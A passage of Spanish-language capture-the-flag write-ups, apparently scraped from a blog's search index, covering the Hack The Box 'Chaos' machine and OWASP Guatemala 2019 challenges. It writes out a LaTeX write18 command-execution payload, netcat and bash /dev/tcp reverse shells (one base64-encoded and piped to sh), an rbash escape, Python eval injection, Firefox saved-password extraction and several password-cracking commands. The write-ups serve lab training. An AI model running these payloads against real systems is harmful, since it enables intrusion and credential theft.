lbmNyeXB0KGNodW5rKSkKCmRlZiBnZXRLZXkocGFzc3dvcmQpOgogICAgICAgICAgICBoYXNoZXIgPSBTSEEyNTYubmV3KHBhc3N3b3JkLmVuY29kZSgndXRmLTgnKSkKICAgICAgICAgICAgcmV0dXJuIGhhc2hlci5kaWdlc3QoKQoK Comandos Utilizados:\n1 2 3 4 5 6 openssl s_client -connect 10.10.10.120:993 a login ayush jiujitsu a select Drafts UID FETCH 1 (BODY[0]) UID FETCH 1 (BODY[2]) \u0026lt;-- Lectura del primer archivo UID FETCH 1 (BODY[3]) \u0026lt;-- Lectura del segundo archivo El primer archivo pertenece a enmsg.txt y el segundo al archivo que encriptó enmsg.txt.\nAhora que tenemos el archivo de encriptacion podemos escribir algunas funciones para poder desencriptar el archivo.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 import os, random from Crypto.Cipher import AES from Crypto.Hash import SHA256 def decrypt(key, filename): chunksize = 64*1024 outputFile = \u0026#39;dec\u0026#39; with open(filename, \u0026#39;rb\u0026#39;) as infile: filesize = long(infile.read(16)) IV = infile.read(16) decryptor = AES.new(key, AES.MODE_CBC, IV) with open(outputFile, \u0026#39;wb\u0026#39;) as outfile: while True: chunk = infile.read(chunksize) if len(chunk) == 0: break outfile.write(decryptor.decrypt(chunk)) outfile.truncate(filesize) def getKey(password): hasher = SHA256.new(password) return hasher.digest() def Main(): filename = \u0026#39;/path/to/file/file_enc\u0026#39; password = \u0026#39;sahay\u0026#39; decrypt(getKey(password), filename) print(\u0026#34;Done.\u0026#34;) if __name__ == \u0026#39;__main__\u0026#39;: Main() Al ejecutar nuestro escript nos muestra un mensaje en base64 este mismo lo decodificamos y nos muestra un segundo mensaje que nos habla de un servicio de pdf y una url donde este se encuentra.\n1 2 3 4 5 6 7 8 9 10 Hii Sahay Please check our new service which create pdf p.s - As you told me to encrypt important msg, i did :) http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3 Thanks, Ayush Agregamos el nuevo dominio a nuestro archivo /etc/hosts.\n1 2 # [/etc/hosts] 10.10.10.120\tchaos.htb RCE - pdfTEXT [LaTex] Al visitar la url del mensaje nos muestra lo que parece ser un servicio de creacion de PDF, al enviar un texto con el Template test1 nos muestra en la parte de respuesta en este caso en el METODO POST, la version de pdfTEXT. Investigamos un poco acerca de este servicio y encontramos un post que habla de una vulnerabilidad en los compiladores basados en LaTex, en el cual se pueden ejecutar comandos en el servidor donde este corriendo un servicio basado en este.\nhacking-with-latex Utilizamos el siguiente payload y un comando para comprobar que estos se ejecutan en la maquina, se envio por medio del Template test3:\nPayload:\n1 \\immediate\\write18{#ComandoAqui} Comando:\n1 nslookup sckull.htb 10.10.13.27 Responder:\nAhora que tenemos un \u0026lsquo;pequeño\u0026rsquo; acceso mediante ejecucion de comandos, vamos a descargar un archivo que contiene una shell inversa para ejecutarlo y obtener acceso.\nShell:\n1 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.10.13.27 7878 \u0026gt;/tmp/f Codificamos a base64:\n1 cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTAuMTMuMjcgNzg3OCA+L3RtcC9mCg== Payload:\n1 \\immediate\\write18{echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTAuMTMuMjcgNzg3OCA+L3RtcC9mCg==|base64 -d \u0026gt; shell.sh \u0026amp;\u0026amp; sh shell.sh} Al enviar este mensaje la maquina decodifica nuestra shell y la agrega a un archivo (shell.sh) luego de esto la ejecuta y obtenemos nuestra shell como usuario www-data.\nActualizamos nuestra shell con python, al intentar ingresar al directorio de ayush nos dice permiso denegado, anteriormente encontramos una contraseña para ayush utilizamos la misma para poder escalar a ese usuario mediante el comando su, pero al intentar ingresar a su carpeta principal nos muestra que cd esta restringido.\nPara poder escapar este mensaje o rbash utilizamos tar:\n1 tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/bash Tambien agregamos a la variable PATH:\n1 export PATH=/usr/bin:/bin Al realizar todo esto podemos ingresar a la carpeta de ayush y obtener nuestra bandera user.txt.\nPRIVILEGE ESCALATION Hicimos una pequeña enumeracion en los directorios de Ayush y encontramos una carpeta de .mozilla que pertenece a el navegador firefox, revisamos los archivos que contiene esta carpeta y encontramos el archivo login.json que almacena las contraseñas de firefox.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 { \u0026#34;nextId\u0026#34;:3, \u0026#34;logins\u0026#34;:[ { \u0026#34;id\u0026#34;:2, \u0026#34;hostname\u0026#34;:\u0026#34;https://chaos.htb:10000\u0026#34;, \u0026#34;httpRealm\u0026#34;:null, \u0026#34;formSubmitURL\u0026#34;:\u0026#34;https://chaos.htb:10000\u0026#34;, \u0026#34;usernameField\u0026#34;:\u0026#34;user\u0026#34;, \u0026#34;passwordField\u0026#34;:\u0026#34;pass\u0026#34;, \u0026#34;encryptedUsername\u0026#34;:\u0026#34;MDIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECDSAazrlUMZFBAhbsMDAlL9iaw==\u0026#34;, \u0026#34;encryptedPassword\u0026#34;:\u0026#34;MDoEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECNx7bW1TuuCuBBAP8YwnxCZH0+pLo6cJJxnb\u0026#34;, \u0026#34;guid\u0026#34;:\u0026#34;{cb6cd202-0ff8-4de5-85df-e0b8a0f18778}\u0026#34;, \u0026#34;encType\u0026#34;:1, \u0026#34;timeCreated\u0026#34;:1540642202692, \u0026#34;timeLastUsed\u0026#34;:1540642202692, \u0026#34;timePasswordChanged\u0026#34;:1540642202692, \u0026#34;timesUsed\u0026#34;:1 } ], \u0026#34;disabledHosts\u0026#34;:[ ], \u0026#34;version\u0026#34;:2 } Para poder obtener el usuario y contraseña de este archivo utilizamos firefox_decrypt, lo descargamos en la maquina y lo ejecutamos, al ejecutarlo nos pide la contraseña para el usuario ayush la ingresamos (jiujitsu), luego de eso nos muestra el usuario y contraseña en ese archivo.\n1 2 3 Website: https://chaos.htb:10000 Username: \u0026#39;root\u0026#39; Password: \u0026#39;Thiv8wrej~\u0026#39; Escalamos con el usuario root y contraseña, obteniendo privilegios root y nuestra bandera root.txt.\n","description":"Chaos expone WordPress donde desbloqueamos un post con informacion de WPScan, dicho post presenta credenciales que nos dieron acceso al puerto IMAP, encontramos un correo encriptado el cual nos guió a pdfTEXT (LaTex) donde explotamos un RCE y escapamos de una shell limitada. Contraseñas guardadas en el directorio Firefox nos permitió escalar privilegios.","id":203,"section":"posts","tags":["wpscan","webmin","imap","pdfTEXT","laTex","DNS exfil","tar","firefox"],"title":"Hack The Box - Chaos","uri":"https://sckull.github.io/posts/chaos/"},{"content":"\rOWASP CTF es una maquina del OWASP Guatemala, aqui encontrarás la solucion para obtener la flag user.txt y root.txt de las diferentes maquinas Windows y Linux presentadas por los organizadores.\nINFRAESTRUCTURA 1 NMAP Escaneo de puertos/version/sistema operativo con nmap\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-16 02:46 CDT Nmap scan report for 192.168.1.15 Host is up (0.00094s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Microsoft Windows XP microsoft-ds MAC Address: 00:0C:29:87:DA:AB (VMware) Device type: general purpose Running: Microsoft Windows XP OS CPE: cpe:/o:microsoft:windows_xp::sp2 cpe:/o:microsoft:windows_xp::sp3 OS details: Microsoft Windows XP SP2 or SP3 Network Distance: 1 hop Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 9.89 seconds METASPLOIT Utilizamos el exploit netapi para windows xp contra el sistema operativo.\nSHELL Obtenemos permisos de administrador y nuestra flag en el Escritorio.\nflag.txt: flag{w1nd0ws_n3tap1_3xplo1t}\nINFRAESTRUCTURA 2 NMAP Escaneo de puertos tcp/version/sistema con nmap.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-16 03:54 CDT Nmap scan report for 192.168.1.14 Host is up (0.00088s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 8009/tcp open ajp13 Apache Jserv (Protocol v1.3) | ajp-methods: |_ Supported methods: GET HEAD POST OPTIONS 8080/tcp open http Apache Tomcat 9.0.10 |_http-favicon: Apache Tomcat |_http-title: Apache Tomcat/9.0.10 MAC Address: 00:0C:29:AB:85:8F (VMware) Device type: general purpose Running: Linux 3.X|4.X OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 OS details: Linux 3.2 - 4.9 Network Distance: 1 hop TRACEROUTE HOP RTT ADDRESS 1 0.88 ms 192.168.1.14 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 9.26 seconds. Puerto 8009 Nos muestra un error de conexion.\nHTTP En el puerto 8080 nos muestra una pagina corriendo en tomcat.\nUtilizamos el panel de control para obtener acceso. Siempre probamos las contraseñas comunes o por default de alguna plataforma para ver si logramos obtener accesso, este es el caso de esta maquina.\n1 2 user: tomcat pass: s3cret Ahora tenemos acceso al panel de control de tomcat, podemos subir una shell/payload con extension war.\nCreamos nuestra reverse shell o payload con msfvenom y configuramos metasploit para poder obtener una sesion o shell por medio del payload.\nSubimos nuestro archivo en el panel de control en a parte de \u0026lsquo;WAR file to deploy\u0026rsquo;.\nPara ejecutar nuestra shell solo buscamos en la lista que nos aparece por encima y basta con darle click para que se habra una sesion en metasploit.\nMetasploit Actualizamos nuestra shell con python3.\nEstando dentro obtenemos nuestra bandera en la carpeta principal del usuario retoinfra1.\nuser.txt:flag{t0mcat_fa1_cr3dent1als}\nPRIVILEGE ESCALATION Utilizndo pspy encontramos un cronjob que se ejecuta cada minuto y ejecuta un archivo sh en /home/retoinfra1/script.sh.\nYa que podemos editar el archivo y se ejecuta cada minuto vamos a modificar el script.sh para obtener una shell inversa, agregamos una linea de comando que nos permite obtener una shell inversa.\n1 echo \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.1.10/7878 0\u0026gt;\u0026amp;1\u0026#34; \u0026gt;\u0026gt; script.sh Ponemos a la escucha nuestro puerto en netcat, esperamos y obtenemos nuestra shell inversa como usuario root.\nroot.txt:flag{cr0n_fa1l_bash_scr1pt}\nINFRAESTRUCTURA 3 NMAP Escaneo de puertos tcp con nmap.\n1 2 3 4 5 6 7 8 9 10 11 12 13 Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-16 03:17 CDT Nmap scan report for 192.168.1.21 Host is up (0.000077s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.5p1 Ubuntu 10ubuntu0.1 (Ubuntu Linux; protocol 2.0) 5355/tcp open llmnr? 10000/tcp open tcpwrapped MAC Address: 00:0C:29:85:13:94 (VMware) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 142.49 seconds PUERTO 10000 NETCAT - PUERTO 10000 EJECUTANDO comandos - NETCAT 10000 http://intx0x80.blogspot.com/2017/05/python-input-vulnerability_25.html\nAl pasarle una cadena de texto al \u0026lsquo;input\u0026rsquo; este lo evalua, si le pasamos la siguiente linea de codigo \u0026quot;__import__('os').system('id')\u0026quot; lo va ejecutar.\nEncontramos unas credenciales, para poder verlas utilizamos \u0026quot;__import__('os').system('cat credentials.txt')\u0026quot;\ncredentials.txt\n1 2 user: retoinfra2 password: 1337hackme! Nos logeamos por medio de SSH con las credenciales que encontramos.\nEncontramos el archivo ping que nos mostraba en el navegador:\n1 2 3 4 5 6 7 8 #!/usr/bin/python import time, random num_packets = int(input(\u0026#39; Please enther number of packets: \u0026#39;)) print \u0026#39;\u0026#39; print \u0026#39;PING localhost (127.0.0.1) 56(84) bytes of data\u0026#39; for i in range(num_packets): time.sleep(1) print \u0026#39;64 bytes from localhost (127.0.0.1): icmp_seq={} ttl=64 time=0.0{} ms\u0026#39;.format(i+1, int(random.random() * 100)) Tambien con nuestro archivo flag user y un hint:\nuser.txt: flag{598852e2cd167e254ce4c5e95393c372}\n1 2 3 4 5 cat hint.txt Si estas leyendo esto felicidades, vas muy bien... Para la elevacion de privilegios en esta maquina tiene que realizar port forwarding... debug to rce werkzeug .... Revisamos los puertos con netstat -ntpl\n1 2 3 4 5 6 7 8 9 10 (Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.) Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.0.1:5000 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:5355 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:10000 0.0.0.0:* LISTEN 3740/socat tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp6 0 0 :::5355 :::* LISTEN - tcp6 0 0 :::22 :::* LISTEN - Como lo dice el hint vamos a hacer port fordwarding del puerto 5000, lo vamos a traer a nuestra maquina local por medio de SSH.\n1 ssh -L 5656:127.0.0.1:5000 retoinfra2@192.168.1.21 Revisamos localmente con netstat -tnpl y tenemos localmente el puerto 5000 en el puerto 5656 :).\n1 2 3 4 5 6 7 root@sckull:~/owasp/infra# netstat -ntpl Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:111 0.0.0.0:* LISTEN 1/init tcp 0 0 127.0.0.1:5656 0.0.0.0:* LISTEN 4456/ssh tcp6 0 0 :::111 :::* LISTEN 1/init tcp6 0 0 ::1:5656 :::* LISTEN 4456/ssh Como lo decia el hint, debug to rce werkzeug, encontramos un script que nos ayuda a ejecutar comandos en la maquina cuando esta activado \u0026ldquo;debug=True\u0026rdquo;.\nhttps://github.com/its-arun/Werkzeug-Debug-RCE\nEjecutamos el script y le pasamos la ip local con el puerto que trajimos con SSH tambien le pasamos un comando y eventualmente obtenemos la bandera root.txt\nintra2_root.webp\nroot.txt: flag{8eab1e913f4a669eddbbd45c1484925a}\nSHELL ROOT Agregamos una shell inversa a un archivo sh en la carpeta del usuario que tenemos con bajos privilegios, para ejecutarlo como usuario root.\n1 2 3 retoinfra2@ubuntu:~$ echo \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.1.10/7878 0\u0026gt;\u0026amp;1\u0026#34; \u0026gt; shell.sh retoinfra2@ubuntu:~$ pwd /home/retoinfra2 Y por medio del script ejecutamos el archivo que contiene nuestra shell inversa y obtenemos una shell como root.\nroot.txt: flag{8eab1e913f4a669eddbbd45c1484925a}\nuser.txt: flag{598852e2cd167e254ce4c5e95393c372}\n","description":"OWASP CTF es una maquina del OWASP Guatemala, aqui encontrarás la solucion para obtener la flag user.txt y root.txt de las diferentes maquinas Windows y Linux presentadas por los organizadores.","id":204,"section":"posts","tags":[],"title":"OWASP CTF 2019 Guatemala - Infraestructura","uri":"https://sckull.github.io/posts/owaspinfra/"},{"content":"\rOWASP CTF es una serie de retos del OWASP Guatemala, aqui encontrarás la solucion para obtener las flags de los diferentes retos presentados por los organizadores.\nSCOREBOARD TRIVIA Dark Army whiterose\nFriends angela_moss\nE-corp flag{fsociety00.dat}\nFsociety mr robot\nCRYPTO BASE Decodificamos el mensaje en base32.\nComando:\n1 echo MZWGCZ33MJQXGZJTGJPWS427OZSXE6K7MJXXEZLEEF6Q====|base32 -d flag{base32_is_very_bored!}\nPI PI PI Utilizando google buscamos una de las strings (\u0026ldquo;di-dah-dah\u0026rdquo;) y encontramos que es codigo morse utilizando di y dah que representan los sonidos. Codigo morse.\n1 dah-dah-dah di-dah-dah di-dah di-di-dit di-dah-dah-dit dah-dah-dah-dah-dah di-dah-dah-dah-dah di-di-dah-dah-dah di-di-di-dah-dah di-di-di-di-dah di-di-di-di-dit dah-di-di-di-dit dah-dah-di-di-dit dah-dah-dah-di-dit dah-dah-dah-dah-dit Escribí un pequeño script en python utilizando la tabla de valores descritos en la pagina(Codigo morse).\nMorse_leng.py - GitHub flag: OWASP0123456789\nBRAIN Brainfuck es un lenguaje que se representa por medio de los caracteres \u0026gt;\u0026lt;+-.,[] para obtener la flag se utilizo un decoder online. https://www.dcode.fr/brainfuck-language\n1 ++++++++++[\u0026gt;+\u0026gt;+++\u0026gt;+++++++\u0026gt;++++++++++\u0026lt;\u0026lt;\u0026lt;\u0026lt;-]\u0026gt;\u0026gt;\u0026gt;\u0026gt;++.++++++.-----------.++++++.++++++++++++++++++++.-------------------------.++++++++++++++++.-----------------.\u0026lt;\u0026lt;+++++++++++++++++++.\u0026gt;\u0026gt;+++++++++++++.--------.+++++++++++++++.------------------.++++++++.------------.++++++++++++++++++++++++.----------------------.++++++++++++++++++.--------------------.+++++++++.\u0026lt;\u0026lt;++.\u0026gt;\u0026gt;++++++++++.\u0026lt;\u0026lt;.\u0026gt;\u0026gt;+++++++++++. flag{bra1nfuck_was_h3r3} HTP Nos dan lo que parece una contraseña para poder obtener que tipo de hash es utilizamos hashcat, de igual forma para desencriptar la contraseña la misma herramienta.\n1 Grecie:$apr1$9zQh77LH$cbQwfDnON90qz0mhYg1Yv. Hashcat - 1600 Decrypted:\n1 $apr1$9zQh77LH$cbQwfDnON90qz0mhYg1Yv.:classof08 flag{classof08}\nTURIN En este reto nos dan un string y una imagen, con el titulo se puede concluir que pertenece a la maquina de turing y la imagen pertenece a la configuracion que debe de tener la maquina para poder obtener el mensaje oculto en el string. Utilizamos la pagina de cryptii.com para obtener nuestra flag.\n1 text:ixqajtrjaq flag{heilhitler}\nIMPA Para este reto nos dan una pista, al investigar acerca del personaje nos encontramos en la wiki de zelda el lenguaje Sheikah, utilizamos imagenes de google para poder obtener nuestra bandera tambien existe un traductor en dcode.fr/sheikah-language\nWiki de Zelda Reto:\nImpa:\nflag{ZELDALOVEU}\nBATMAN Utilizamos motherreff.in para decodificar la flag.\n1 AABABABABAAAAAAAABBA{AAAABAAAAABAABAABABBAAAAAABBAAAAABAAABBBABAAAABBBAAABAABAAAAABAAABAAABAABAAAAAAABAAABBABBA} FLAG{BATMANCHIPERISEASY}\nKING Un poco de informacion de este reto, la NSA mostro un mensaje parecido a este en un twitt, segun un post es un tipo de rompecabezas que vienen en los periodicos. Existen difrentes paginas que pueden decodificar mensajes de este tipo.\ncryptogram oneacross quipqiup Para resolver este reto utilizamos una pagina de las listadas anteriormente.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 izu gjweft yifgx izji tjluy wf yuwyu yijgiy frr vkiz jw kdu dgujt igadl j dzur jwe j hkudu fr hpaif. izu maxy izji fvwue izu kdu dgujt igadl yifpu izu hkudu fr hpaif rgft izu hjyigx dzur vzf fnijkwue ki rgft izu rpxkwm upuhzjwi. izu rpxkwm upuhzjwi mfi ki rgft j yatf vguyipug vzf fnijkwue ki kw izu yatf dzjthkfwyzkh fw yjiagw. izux vuwi if yjiagw nudjayu qahkiug vjy rapp fr taijwi nujsdffwy. izu nujsdffwy vugu rgft tjgy vzugu izu nannpx nannpuy, jw jwdkuwi rjwm izji vjy nagkue kw djtupfi pksue. izu nannpx nannpuy djtu njdl jiug izu dpfvwy guyaggudiue zkt kw jw jwdkuwi nagkjp yhupp fr tjmkdjpwuyy. izuw izu dfgwefm rgft suway puje jw jiijdl fr djwfuy fwif izu gayykjwy vzf guyhfweue nx ijlkwm tdefwjpey jvjx rgft dzkwj. ykwdu dzkwj ekew\u0026#39;i zjsu jwxtfgu tdefwjpey izux eudkeue if nax j hkccj zai. izu hkccj zai vjy izuw yifpuw nx j ijplkwm upuhzjwi rgft kwekj. izu upuhzjwi vjy izu maga\u0026#39;y jwe zu pksue ji izu jyzgjt kw pfy jwmupuy. izu upuhzjwi zje j hkm rgkuwe vzf ijamzi tjiz. izu hkm ubhpfeue fwu ejx jwe puri izu vzfpu vfgpe vfweugkwm. ykwdu izu hkm ubhpfeue izu lkwm hkm npjtue izu mkjwiy. ykwdu izu mkjwiy zjiue nukwm npjtue izux pue jw jiijdl fw izu lkwm jwe ykwdu izux vugu fr dfagyu tadz nkmmug izux vugu skdifgkfay. jriug izu mkjwiy iffl dfwigfp fr mguuwpjwe izux yijgiue rkmzikwm izu sklkwmy rgft kdupjwe. izu fhhfwuwiy vugu uouwpx tjidzue yf izux uweue ah euyigfxkwm ujdz fizug jwe izux nudjtu ubikwdi. izuw izu mfgkppjy yifpu izu zfwej igjkp 70\u0026#39;y rgft ifwx yfhgjwf izu puje mjwmyiug rgft kijpx. ifwx yfhgjwf jdiajppx mfi izu zfwej\u0026#39;y rgft kwekj jwxzfv njdl if izu mfgkppjy. izu mfgkppjy yijgiue djaykwm j galay kw izu nkm jhhpu, jdiajppx j nkm jhhpu, vzugu izux gjw fsug nkppx qfu jwe ukpuuw. ykwdu izu rffinjpp hpjxugy vugu dzjykwm izut izu mfgkppjy zfhhue kwif izu mkjwi hujdz vkiz qjtuy vzf vjy uydjhkwm zky uskp hjguwiy. izu yifgx uwey izugu k\u0026#39;t yfggx if yjx nai fz vupp zux, zux, zux. izu rpjm ky \u0026#34;izux jpp pksue zjhhkpx uoug jriug\u0026#34;. 1 the random story that makes no sense starts off with an ice cream truck a chef and a piece of pluto the guys that owned the ice cream truck stole the piece of pluto from the pastry chef who obtained it from the flying elephant the flying elephant got it from a sumo wrestler who obtained it in the sumo championship on saturn they went to saturn because jupiter was full of mutant beavcoons the beavcoons were from mars where the bubbly bubbles an ancient fang that was buried in camelot lived the bubbly bubbles came back ater the clowns resurrected him in an ancient burial spell of magicalness then the corndog from venus lead an attack of canoes onto the russians who responded by taking mcdonalds away from china since china didn t have anymore mcdonalds they decided to buy a pizza hut the pizza hut was then stolen by a talking elephant from india the elephant was the guru s and he lived at the ashram in los angeles the elephant had a pig friend who taught math the pig exploded one day and left the whole world wondering since the pig exploded the king pig blamed the giants since the giants hated being blamed they led an attack on the king and since they were of course much bigger they were victorious after the giants took control of greenland they started fighting the vikings from iceland the opponents were eqenly matched so they ended up destroying each other and they became extinct then the gorillas stole the honda trail s from tony soprano the lead gangster from italy tony soprano actually got the honda s from india anyhow back to the gorillas the gorillas started causing a rukus in the big apple actually a big apple where they ran over billy joe and eileen since the football players were chasing them the gorillas hopped into the giant peach with james who was escaping his evil parents the story ends there i m sorry to say but oh well hey hey hey the flag is they all lived happily eqer after Se cambio la q por una v.\nthey all lived happily eqer after\nflag: they all lived happily ever after\nSAVE ME! Archivos .fun, Investigamos sobre la extension de estos archivos y encontramos que es un virus de tipo ransomware, el cual encripta los archivos con esa extension.\nFun ransomware Para obtener los archivos encriptados en el archivo del reto utilizamos jigsaw.exe el cual nos permite desencriptar este tipo de archivos.\nflag{Jigsaw_ransomware_in_house}\nESTEGANOGRAFIA DATA Utilizamos exif para ver los metadatos de la imagen y encontramos la flag.\nflag{metadata_in_the_dark}\nMATRIX Utilizamos inlite para decodificar la imagen One Line BarCode Reader\nflag{matr1x_qr}\nMONDRIAN Una imagen que tiene un mensaje oculto, este lenguaje se llama piet y se encuentra en imagenes que parecen estilo abstractas. Piet\nDecodificamos la imagen aqui:\nNpiet Execute flag{p1et_programm1ng!}\nHIDE Utilizamos binwalk para extraer lo que esta en el interior de la imagen, al extraer el archivo descomprimimos de nuevo y obtenemos un archivo txt, este nos indica que esta en diferentes bases, decodificamos el mensaje en base64 y base32 para obtener la flag.\ntryhackme{b1nw4lk_0r_f0r3mo5t}\nREVERSING CRACKME1 Para hacer una compilacion inversa al archivo crackme.pyc existe una herramienta llamada uncompyle2 para obtener el codigo fuente equivalente al archivo.\nComando:\n1 uncompyle2 crackme.pyc -o crackme.py Codigo fuente (Ordenado manualmente para obtener la flag):\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 import random lr = \u0026#39;2\u0026#39; db = \u0026#39;w\u0026#39; ef = \u0026#39;s\u0026#39; ty = \u0026#39;3\u0026#39; gh = \u0026#39;!\u0026#39; aa = \u0026#39;O\u0026#39; rr = \u0026#39;p\u0026#39; nn = \u0026#39;a\u0026#39; chains = [116,104,105,115,32,105,115,32,97,32,116,114,111,108,108] chars = [] lock_pick = random.randint(0, 1000) lock = lock_pick * 2 password = [105,116,115,32,110,111,116,32,116,104,97,116,32,101,97,115,121] lock = lock + 10 lock = lock / 2 auth = [107,101,101,112,32,116,114,121,105,110,103] lock = lock - lock_pick print lock slither = aa + db + nn + ef + rr + gh + lr + ty print slither keys = [112,97,115,115,119,111,114,100,33,33] print \u0026#39;Authentication required\u0026#39; print \u0026#39;\u0026#39; user_input = raw_input(\u0026#39;Enter your username\\n\u0026#39;) if user_input == slither: print \u0026#39;yeeeea! correct user!\u0026#39; else: print \u0026#39;Wrong username try harder\u0026#39; exit() flag: Owasp!23\nCRACKME2 Utilizamos rabin2 para obtener las strings dentro del archivo bin y obtuvimos el usuario correcto.\nflag: hax0r\nMISC SHADOW Un archivo que contiene la contraseña del usuario root, usamos john the ripper para obtener la ocnttraseña.\nflag{toor} REGISTER La bandera de este reto pertenece al reto de registrarse en la plataforma. http://ctf.develsecurity.com/0x1 En hora buena por tu registro , tu premio es la flag para el reto register en la categoria misc.\nflag{00010!}\nPDF Utilizamos pdfcrack y el diccionario Ashley Madison. Diccionario: AshleyMadisonCracked\nComando:\n1 pdfcrack -f flag-protected.pdf -w AshleyMadisonCracked.txt Contraseña: zerkalo1974\nflag{pdfcrack_was_here!}\nKEEP Utilizamos keepass2john para obtener el hash y hashcat para obtener la contraseña del archivo.\n1 $keepass$*2*60000*0*cc74b5166afe1df0757d8d208078d4d2f9fe3e331ff730b9cb5cfb94064eea50*b6d616ca2c797d4a942df786640acc92749f8005fc2b31114c0ba5b2aced9a5e*459b7fe3b1200a8b48ad9663925465c4*72cdc691f0f93f79476c83f8b1f1db44ab23ca6217048cd67bbde5e8ff76b402*1acb7f5538987791204995bc3c1ba96a254b3be85051946058b07ee6ef1b4d45 Comando hashcat:\n1 hashcat64.bin -m 13400 keepas.txt ../rockyou.txt -o keepas_owasp.txt Contraseña: zaq1zaq1\nUtilizamos keepassx para abrir el archivo Database.kdbx.\nVemos un mensaje de flag pero no aparece nuestra flag como cadena normal, el texto que aparece en el campo de password parece ser base64 invertida, invertimos el mensaje y decodificamos.\nComando:\n1 echo =0HZy92dzNXYw9VZyV3YlNnbx8Fa0FzdfNXYwVWZr91ZuFzahVmcit3ZhxmZ |rev|base64 -d flag{break1ng_keepas_w1th_1nsecure_password}\nZERO Para este reto escribí un script en python y con el codigo ascii que aparece en el archivo leeme.txt generamos un codigo de barras para luego obtener la bandera en https://online-barcode-reader.inliteresearch.com/.\nstego_zero.py - GitHub flag{qr_to_ascii_art}\nPORT Para este reto hicimos un escaneo de puertos con nmap a la plataforma del ctf, encontramos el puerto 1337 al visitarlo nos muestra un error con nuestra flag.\nComando:\n1 nmap -p1-65535 ctf.develsecurity.com 1 2 3 4 5 6 7 8 9 10 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) 25/tcp filtered smtp 80/tcp open http 81/tcp open http Apache httpd 2.4.18 ((Ubuntu)) 82/tcp open http Apache httpd 2.4.18 ((Ubuntu)) 83/tcp open http Apache httpd 2.4.18 ((Ubuntu)) 84/tcp open http Apache httpd 2.4.18 ((Ubuntu)) 111/tcp open rpcbind 2-4 (RPC #100000) 1337/tcp open waste? Mensaje al visitar la pagina.\n1 2 3 4 5 6 7 8 9 xmp\u0026amp;gt;perl: warning: Setting locale failed. perl: warning: Please check that your locale settings: LANGUAGE = (unset), LC_ALL = (unset), LANG = \u0026#34;es_GT.UTF-8\u0026#34; are supported and installed on your system. perl: warning: Falling back to the standard locale (\u0026#34;C\u0026#34;). Unescaped left brace in regex is deprecated, passed through in regex; marked by \u0026lt;!-- HERE in m/%{ --\u0026gt; HERE (.*?)}/ at /usr/bin/print line 528. Error: no such file \u0026#34;flag{secret_in_the_port_is_null}\u0026#34; flag{secret_in_the_port_is_null}\nMOBILE MOBILE Utilizamos apktool para poder decompilar el archivo Mobile1.apk y ver el codigo que tiene dentro. Tambien podemos utilizar Java Decompilers para el mismo fin.\nLa flag se encuentra en HelloWorldActivity.\nCodigo generado por javadecompilers.\n1 2 3 4 5 6 7 8 9 10 11 package com.example.helloworld; import android.os.Bundle; import com.phonegap.DroidGap; public class HelloWorldActivity extends DroidGap { public void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); super.loadUrl(\u0026#34;flag{de0fuscate_code}\u0026#34;); } } flag{de0fuscate_code}\nWEB HIDE Para este reto buscamos directorios comunes, tambien buscamos en el codigo fuente de las paginas. http://ctf.develsecurity.com:81/admin/flag.txt\nflag{http_directory_indexing}\nDEFAULT De igual forma, algunos directorios comunes. http://ctf.develsecurity.com:82/install/\nflag{default_files_installation_fake_cms}\nINJECT XPATH INJECTION Probamos con alguno de los payloads aqui descritos y obtuvimos la flag.\nPayloads: XPATH Injection - PayloadsAllTheThings\nPayload: x' or 